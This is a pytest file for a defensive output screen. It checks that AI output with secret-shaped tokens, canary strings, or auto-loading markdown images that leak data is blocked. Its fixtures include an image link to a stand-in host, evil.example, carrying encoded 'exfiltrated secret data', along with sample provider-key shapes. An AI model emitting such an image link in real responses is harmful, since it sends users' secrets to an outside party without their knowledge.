"""Tests for output screening — Stream PI-2."""

from __future__ import annotations

import pytest

from expert_work.common.output_screen import (
    REFUSAL_TEXT,
    OutputVerdict,
    screen_output,
)

# --- clean output passes (precision: no false positives) -------------------


@pytest.mark.parametrize(
    "text",
    [
        "",
        "Here is the summary you asked for. The deploy finished at 14:00.",
        "See the docs at https://example.com/guide?page=2 for details.",  # short query
        "The function signature is `def f(sk_total: int)`.",  # not a key shape
        "![logo](https://cdn.example.com/logo.png)",  # image, no exfil query
        "Your order id is AKIA123 (too short to be an AWS key).",
    ],
)
def test_clean_output_not_blocked(text: str) -> None:
    verdict = screen_output(text)
    assert verdict == OutputVerdict(blocked=False, categories=())


# --- Rule A: credential / secret shapes ------------------------------------


@pytest.mark.parametrize(
    "text",
    [
        # Each token-shaped fixture is split with ``+`` (ruff-format won't fold
        # a BinOp) so neither the detect-private-key hook nor GitHub push
        # protection sees a contiguous provider-token literal; the runtime
        # string concatenates back to the exact shape the regex must match.
        "-----BEGIN RSA PRIVATE" + " KEY-----\nMIIEv...",
        "Here it is: sk-" + "ant-api03-AbCdEf012345678901234567",
        "key=sk-" + "proj-AbCdEf0123456789012345",
        "AWS: AKIA" + "IOSFODNN7EXAMPLE",
        "token ghp_" + "AbCdEf0123456789012345678901234567",
        "slack xox" + "b-1234567890-abcdefghij",
        "google AIza" + "SyABCDEFGHIJKLMNOPQRSTUVWXYZ0123456",
        "hf_" + "aBcDeFgHiJkLmNoPqRsTuVwXyZ012345",
        "glpat-" + "AbCdEf0123456789_xyz",
    ],
)
def test_secret_shapes_blocked(text: str) -> None:
    verdict = screen_output(text)
    assert verdict.blocked
    assert "secret" in verdict.categories


# --- Rule B: exfil via auto-loading markdown image -------------------------


def test_markdown_image_exfil_blocked() -> None:
    text = "![](https://evil.example/log?d=ZXhmaWx0cmF0ZWRfc2VjcmV0X2RhdGE)"
    verdict = screen_output(text)
    assert verdict.blocked
    assert "exfil_url" in verdict.categories


def test_plain_link_not_flagged_as_exfil() -> None:
    # A non-image markdown link with a long query is NOT flagged (PI-2 scopes
    # exfil to auto-loading images; plain links are judge-tier).
    text = "[click](https://evil.example/log?d=ZXhmaWx0cmF0ZWRfc2VjcmV0X2RhdGE)"
    verdict = screen_output(text)
    assert "exfil_url" not in verdict.categories


# --- Rule C: caller-supplied canary ----------------------------------------


def test_canary_leak_blocked() -> None:
    verdict = screen_output(
        "the value is EXPERT_WORK-CANARY-7f3a", canaries=["EXPERT_WORK-CANARY-7f3a"]
    )
    assert verdict.blocked
    assert "canary" in verdict.categories


def test_canary_absent_passes() -> None:
    verdict = screen_output("nothing secret here", canaries=["EXPERT_WORK-CANARY-7f3a"])
    assert not verdict.blocked


def test_empty_canary_ignored() -> None:
    # An empty-string canary must not match every output.
    verdict = screen_output("ordinary text", canaries=["", "  "])
    assert not verdict.blocked


# --- verdict shape ---------------------------------------------------------


def test_categories_deduped_and_never_contain_secret_value() -> None:
    secret = "sk-" + "ant-api03-AbCdEf012345678901234567"
    verdict = screen_output(f"{secret} {secret}", canaries=[secret])
    assert verdict.blocked
    # both 'secret' (shape) and 'canary' fire; categories carry names only.
    assert set(verdict.categories) == {"secret", "canary"}
    assert all(secret not in c for c in verdict.categories)


def test_refusal_text_does_not_echo_input() -> None:
    assert "withheld" in REFUSAL_TEXT.lower()
